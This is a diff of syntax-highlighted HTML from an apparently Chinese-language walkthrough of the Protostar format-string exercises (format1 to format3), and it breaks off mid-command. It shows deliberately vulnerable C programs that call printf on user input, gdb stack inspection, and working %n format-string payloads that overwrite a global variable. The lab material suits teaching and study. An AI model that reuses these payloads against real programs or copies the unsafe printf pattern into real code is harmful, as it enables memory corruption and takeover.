-Breakpoint <span class="m">1</span>, 0x08048430 <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">2</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff744<span class="o">)</span> at format1/format1.c:19
-<span class="m">19</span>  <span class="k">in</span> format1/format1.c
-<span class="o">(</span>gdb<span class="o">)</span> x/wx <span class="nv">$esp</span>
-0xbffff680: 0xbffff89f
-<span class="o">(</span>gdb<span class="o">)</span> c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x08048430<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">2</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff744<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>format1/format1.c:19
+<span class="m">19</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>format1/format1.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/wx<span class="w"> </span><span class="nv">$esp</span>
+0xbffff680:<span class="w"> </span>0xbffff89f
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
-0x8048400 &lt;vuln+12&gt;:    call   0x8048320 &lt;printf@plt&gt;
+0x8048400<span class="w"> </span>&lt;vuln+12&gt;:<span class="w">    </span>call<span class="w">   </span>0x8048320<span class="w"> </span>&lt;printf@plt&gt;
 
-Breakpoint <span class="m">2</span>, 0x08048400 <span class="k">in</span> vuln <span class="o">(</span><span class="nv">string</span><span class="o">=</span>0xbffff89f <span class="s2">&quot;%x%x%x%x%x%x%x%x%x%x&quot;</span><span class="o">)</span>
-    at format1/format1.c:10
-<span class="m">10</span>  <span class="k">in</span> format1/format1.c
-<span class="o">(</span>gdb<span class="o">)</span> x/10wx <span class="nv">$esp</span>
+Breakpoint<span class="w"> </span><span class="m">2</span>,<span class="w"> </span>0x08048400<span class="w"> </span><span class="k">in</span><span class="w"> </span>vuln<span class="w"> </span><span class="o">(</span><span class="nv">string</span><span class="o">=</span>0xbffff89f<span class="w"> </span><span class="s2">&quot;%x%x%x%x%x%x%x%x%x%x&quot;</span><span class="o">)</span>
+<span class="w">    </span>at<span class="w"> </span>format1/format1.c:10
+<span class="m">10</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>format1/format1.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/10wx<span class="w"> </span><span class="nv">$esp</span>
 <span class="c1"># (0xbffff89f - 0xbffff660) % 4 = 3</span>
-0xbffff660: 0xbffff89f  0x0804960c  0xbffff698  0x08048469
-0xbffff670: 0xb7fd8304  0xb7fd7ff4  0xbffff698  0x08048435
-0xbffff680: 0xbffff89f  0xb7ff1040
-<span class="o">(</span>gdb<span class="o">)</span> c
+0xbffff660:<span class="w"> </span>0xbffff89f<span class="w">  </span>0x0804960c<span class="w">  </span>0xbffff698<span class="w">  </span>0x08048469
+0xbffff670:<span class="w"> </span>0xb7fd8304<span class="w">  </span>0xb7fd7ff4<span class="w">  </span>0xbffff698<span class="w">  </span>0x08048435
+0xbffff680:<span class="w"> </span>0xbffff89f<span class="w">  </span>0xb7ff1040
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
 804960cbffff6988048469b7fd8304b7fd7ff4bffff6988048435bffff89fb7ff1040804845b
-Program exited normally.
+Program<span class="w"> </span>exited<span class="w"> </span>normally.
 </code></pre></div>
 </details>
 <details class="note">
 <summary>'%x ' * 10</summary>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> r <span class="s2">&quot;`python -c &quot;</span>print<span class="o">(</span><span class="s1">&#39;%x &#39;</span> * <span class="m">10</span><span class="o">)</span><span class="s2">&quot;`&quot;</span>
-Starting program: /opt/protostar/bin/format1 <span class="s2">&quot;`python -c &quot;</span>print<span class="o">(</span><span class="s1">&#39;%x &#39;</span> * <span class="m">10</span><span class="o">)</span><span class="s2">&quot;`&quot;</span>
-0x8048430 &lt;main+20&gt;:    call   0x80483f4 &lt;vuln&gt;
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span><span class="s2">&quot;`python -c &quot;</span>print<span class="o">(</span><span class="s1">&#39;%x &#39;</span><span class="w"> </span>*<span class="w"> </span><span class="m">10</span><span class="o">)</span><span class="s2">&quot;`&quot;</span>
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/format1<span class="w"> </span><span class="s2">&quot;`python -c &quot;</span>print<span class="o">(</span><span class="s1">&#39;%x &#39;</span><span class="w"> </span>*<span class="w"> </span><span class="m">10</span><span class="o">)</span><span class="s2">&quot;`&quot;</span>
+0x8048430<span class="w"> </span>&lt;main+20&gt;:<span class="w">    </span>call<span class="w">   </span>0x80483f4<span class="w"> </span>&lt;vuln&gt;
 
-Breakpoint <span class="m">1</span>, 0x08048430 <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">2</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff734<span class="o">)</span> at format1/format1.c:19
-<span class="m">19</span>  <span class="k">in</span> format1/format1.c
-<span class="o">(</span>gdb<span class="o">)</span> x/wx <span class="nv">$esp</span>
-0xbffff670: 0xbffff895
-<span class="o">(</span>gdb<span class="o">)</span> c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x08048430<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">2</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff734<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>format1/format1.c:19
+<span class="m">19</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>format1/format1.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/wx<span class="w"> </span><span class="nv">$esp</span>
+0xbffff670:<span class="w"> </span>0xbffff895
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
-0x8048400 &lt;vuln+12&gt;:    call   0x8048320 &lt;printf@plt&gt;
+0x8048400<span class="w"> </span>&lt;vuln+12&gt;:<span class="w">    </span>call<span class="w">   </span>0x8048320<span class="w"> </span>&lt;printf@plt&gt;
 
-Breakpoint <span class="m">2</span>, 0x08048400 <span class="k">in</span> vuln <span class="o">(</span><span class="nv">string</span><span class="o">=</span>0xbffff895 <span class="s2">&quot;%x %x %x %x %x %x %x %x %x %x &quot;</span><span class="o">)</span>
-    at format1/format1.c:10
-<span class="m">10</span>  <span class="k">in</span> format1/format1.c
-<span class="o">(</span>gdb<span class="o">)</span> x/16wx <span class="nv">$esp</span>
-0xbffff650: 0xbffff895  0x0804960c  0xbffff688  0x08048469
-0xbffff660: 0xb7fd8304  0xb7fd7ff4  0xbffff688  0x08048435
-0xbffff670: 0xbffff895  0xb7ff1040  0x0804845b  0xb7fd7ff4
-0xbffff680: 0x08048450  0x00000000  0xbffff708  0xb7eadc76
-<span class="o">(</span>gdb<span class="o">)</span> c
+Breakpoint<span class="w"> </span><span class="m">2</span>,<span class="w"> </span>0x08048400<span class="w"> </span><span class="k">in</span><span class="w"> </span>vuln<span class="w"> </span><span class="o">(</span><span class="nv">string</span><span class="o">=</span>0xbffff895<span class="w"> </span><span class="s2">&quot;%x %x %x %x %x %x %x %x %x %x &quot;</span><span class="o">)</span>
+<span class="w">    </span>at<span class="w"> </span>format1/format1.c:10
+<span class="m">10</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>format1/format1.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/16wx<span class="w"> </span><span class="nv">$esp</span>
+0xbffff650:<span class="w"> </span>0xbffff895<span class="w">  </span>0x0804960c<span class="w">  </span>0xbffff688<span class="w">  </span>0x08048469
+0xbffff660:<span class="w"> </span>0xb7fd8304<span class="w">  </span>0xb7fd7ff4<span class="w">  </span>0xbffff688<span class="w">  </span>0x08048435
+0xbffff670:<span class="w"> </span>0xbffff895<span class="w">  </span>0xb7ff1040<span class="w">  </span>0x0804845b<span class="w">  </span>0xb7fd7ff4
+0xbffff680:<span class="w"> </span>0x08048450<span class="w">  </span>0x00000000<span class="w">  </span>0xbffff708<span class="w">  </span>0xb7eadc76
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
-804960c bffff688 <span class="m">8048469</span> b7fd8304 b7fd7ff4 bffff688 <span class="m">8048435</span> bffff895 b7ff1040 804845b 
-Program exited normally.
+804960c<span class="w"> </span>bffff688<span class="w"> </span><span class="m">8048469</span><span class="w"> </span>b7fd8304<span class="w"> </span>b7fd7ff4<span class="w"> </span>bffff688<span class="w"> </span><span class="m">8048435</span><span class="w"> </span>bffff895<span class="w"> </span>b7ff1040<span class="w"> </span>804845b<span class="w"> </span>
+Program<span class="w"> </span>exited<span class="w"> </span>normally.
 </code></pre></div>
 </details>
 </li>
 </ul>
 <h3 id="exploit_1">Exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ ./format1 <span class="s2">&quot;</span><span class="k">$(</span>python -c <span class="s2">&quot;print &#39;A&#39; * 4 + &#39;\x38\x96\x04\x08&#39; + &#39;B&#39; * 7 + &#39;%x&#39; * 135 + &#39;%n&#39;&quot;</span><span class="k">)</span><span class="s2">&quot;</span>
-AAAA8BBBBBBB804960cbffff5d88048469b7fd8304b7fd7ff4bffff5d88048435bffff7bcb7ff1040804845bb7fd7ff480484500bffff658b7eadc762bffff684bffff690b7fe1848bffff640ffffffffb7ffeff4804824d1bffff640b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff658e8c9752abb7f65000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff68480484508048440b7ff1040bffff67cb7fff8f82bffff7b2bffff7bc0bffff8dcbffff8f1bffff908bffff920bffff92ebffff942bffff963bffff97abffff98dbffff997bffffe87bffffea0bffffedebffffef2bfffff10bfffff27bfffff38bfffff53bfffff5bbfffff6bbfffff78bfffffacbfffffc0bfffffd4bfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff79b1fbffffff2fbffff7ab00120000008433fc8b69057f81755be21d6923a08e3638362f2e00006d726f6631746141414141you have modified the target :<span class="o">)</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>./format1<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;A&#39; * 4 + &#39;\x38\x96\x04\x08&#39; + &#39;B&#39; * 7 + &#39;%x&#39; * 135 + &#39;%n&#39;&quot;</span><span class="k">)</span><span class="s2">&quot;</span>
+AAAA8BBBBBBB804960cbffff5d88048469b7fd8304b7fd7ff4bffff5d88048435bffff7bcb7ff1040804845bb7fd7ff480484500bffff658b7eadc762bffff684bffff690b7fe1848bffff640ffffffffb7ffeff4804824d1bffff640b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff658e8c9752abb7f65000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff68480484508048440b7ff1040bffff67cb7fff8f82bffff7b2bffff7bc0bffff8dcbffff8f1bffff908bffff920bffff92ebffff942bffff963bffff97abffff98dbffff997bffffe87bffffea0bffffedebffffef2bfffff10bfffff27bfffff38bfffff53bfffff5bbfffff6bbfffff78bfffffacbfffffc0bfffffd4bfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff79b1fbffffff2fbffff7ab00120000008433fc8b69057f81755be21d6923a08e3638362f2e00006d726f6631746141414141you<span class="w"> </span>have<span class="w"> </span>modified<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>:<span class="o">)</span>
 </code></pre></div>
 <h2 id="format-2">Format 2<a class="headerlink" href="#format-2" title="Permanent link">&para;</a></h2>
 <blockquote>
 <p>how specific values can be written in memory</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
 
 <span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"> </span><span class="c1">// char *fgets(char *s, int size, FILE *stream);</span>
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have modified the target :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;target is %d :(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have modified the target :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;target is %d :(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">vuln</span><span class="p">();</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">vuln</span><span class="p">();</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>
 <p>变量 <code>target</code> 对应的地址</p>
-<div class="highlight"><pre><span></span><code>$ objdump -t format2 <span class="p">|</span> grep target
-080496e4 g     O .bss   <span class="m">00000004</span>              target
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>objdump<span class="w"> </span>-t<span class="w"> </span>format2<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>target
+080496e4<span class="w"> </span>g<span class="w">     </span>O<span class="w"> </span>.bss<span class="w">   </span><span class="m">00000004</span><span class="w">              </span>target
 </code></pre></div>
 </li>
 <li>
 <p>观察输入字符串在栈中的位置</p>
-<div class="highlight"><pre><span></span><code>$ python -c <span class="s2">&quot;print(&#39;%x &#39; * 20)&quot;</span> <span class="p">|</span> ./format2
-<span class="m">200</span> b7fd8420 bffff514 <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> b7ff000a <span class="m">0</span> 
-target is <span class="m">0</span> :<span class="o">(</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;%x &#39; * 20)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./format2
+<span class="m">200</span><span class="w"> </span>b7fd8420<span class="w"> </span>bffff514<span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span>b7ff000a<span class="w"> </span><span class="m">0</span><span class="w"> </span>
+target<span class="w"> </span>is<span class="w"> </span><span class="m">0</span><span class="w"> </span>:<span class="o">(</span>
 </code></pre></div>
 </li>
 <li>
@@ -3071,62 +3085,62 @@ target is <span class="m">0</span> :<span class="o">(</span>
 <li>当然，可以简单地通过 <code>$</code> 来决定取第几个参数</li>
 </ul>
 <h3 id="exploit_2">Exploit<a class="headerlink" href="#exploit_2" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ python -c <span class="s2">&quot;print(&#39;%x&#39; * 6 + &#39;\xe4\x96\x04\x08&#39; + &#39;A&#39; * 17 + &#39;%n&#39;)&quot;</span> <span class="p">|</span> ./format2
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;%x&#39; * 6 + &#39;\xe4\x96\x04\x08&#39; + &#39;A&#39; * 17 + &#39;%n&#39;)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./format2
 200b7fd8420bffff514782578257825782578257825AAAAAAAAAAAAAAAAA
-you have modified the target :<span class="o">)</span>
+you<span class="w"> </span>have<span class="w"> </span>modified<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>:<span class="o">)</span>
 <span class="c1"># Simple Version</span>
-$ python -c <span class="s2">&quot;print(&#39;\xe4\x96\x04\x08&#39; + &#39;A&#39; * 60 + &#39;%4\$n&#39;)&quot;</span> <span class="p">|</span> ./format2
+$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;\xe4\x96\x04\x08&#39; + &#39;A&#39; * 60 + &#39;%4\$n&#39;)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./format2
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-you have modified the target :<span class="o">)</span>
+you<span class="w"> </span>have<span class="w"> </span>modified<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>:<span class="o">)</span>
 </code></pre></div>
 <h2 id="format-3">Format 3<a class="headerlink" href="#format-3" title="Permanent link">&para;</a></h2>
 <blockquote>
 <p>how to write more than 1 or 2 bytes of memory to the process</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">printbuffer</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">printbuffer</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
+<span class="p">}</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
 
-<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
 
-<span class="w">  </span><span class="n">printbuffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">printbuffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x01025544</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have modified the target :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;target is %08x :(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x01025544</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have modified the target :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;target is %08x :(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">vuln</span><span class="p">();</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">vuln</span><span class="p">();</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>
 <p>变量 <code>target</code> 对应的地址</p>
-<div class="highlight"><pre><span></span><code>$ objdump -t format3 <span class="p">|</span> grep target
-080496f4 g     O .bss   <span class="m">00000004</span>              target
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>objdump<span class="w"> </span>-t<span class="w"> </span>format3<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>target
+080496f4<span class="w"> </span>g<span class="w">     </span>O<span class="w"> </span>.bss<span class="w">   </span><span class="m">00000004</span><span class="w">              </span>target
 </code></pre></div>
 </li>
 <li>
 <p>观察输入字符串在栈中的位置</p>
-<div class="highlight"><pre><span></span><code>$ python -c <span class="s2">&quot;print(&#39;%x &#39; * 20)&quot;</span> <span class="p">|</span> ./format3
-<span class="m">0</span> bffff4d0 b7fd7ff4 <span class="m">0</span> <span class="m">0</span> bffff6d8 804849d bffff4d0 <span class="m">200</span> b7fd8420 bffff514 <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> <span class="m">25207825</span> <span class="m">78252078</span> <span class="m">20782520</span> 
-target is <span class="m">00000000</span> :<span class="o">(</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;%x &#39; * 20)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./format3
+<span class="m">0</span><span class="w"> </span>bffff4d0<span class="w"> </span>b7fd7ff4<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>bffff6d8<span class="w"> </span>804849d<span class="w"> </span>bffff4d0<span class="w"> </span><span class="m">200</span><span class="w"> </span>b7fd8420<span class="w"> </span>bffff514<span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span><span class="m">25207825</span><span class="w"> </span><span class="m">78252078</span><span class="w"> </span><span class="m">20782520</span><span class="w"> </span>
+target<span class="w"> </span>is<span class="w"> </span><span class="m">00000000</span><span class="w"> </span>:<span class="o">(</span>
 </code></pre></div>
 </li>
 <li>
@@ -3134,107 +3148,107 @@ target is <span class="m">00000000</span> :<span class="o">(</span>
 </li>
 </ul>
 <h3 id="exploit_3">Exploit<a class="headerlink" href="#exploit_3" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ python -c <span class="s2">&quot;print(&#39;\xf4\x96\x04\x08&#39; + &#39;%16930112x&#39; + &#39;%12\$n&#39;)&quot;</span> <span class="p">|</span> ./format3
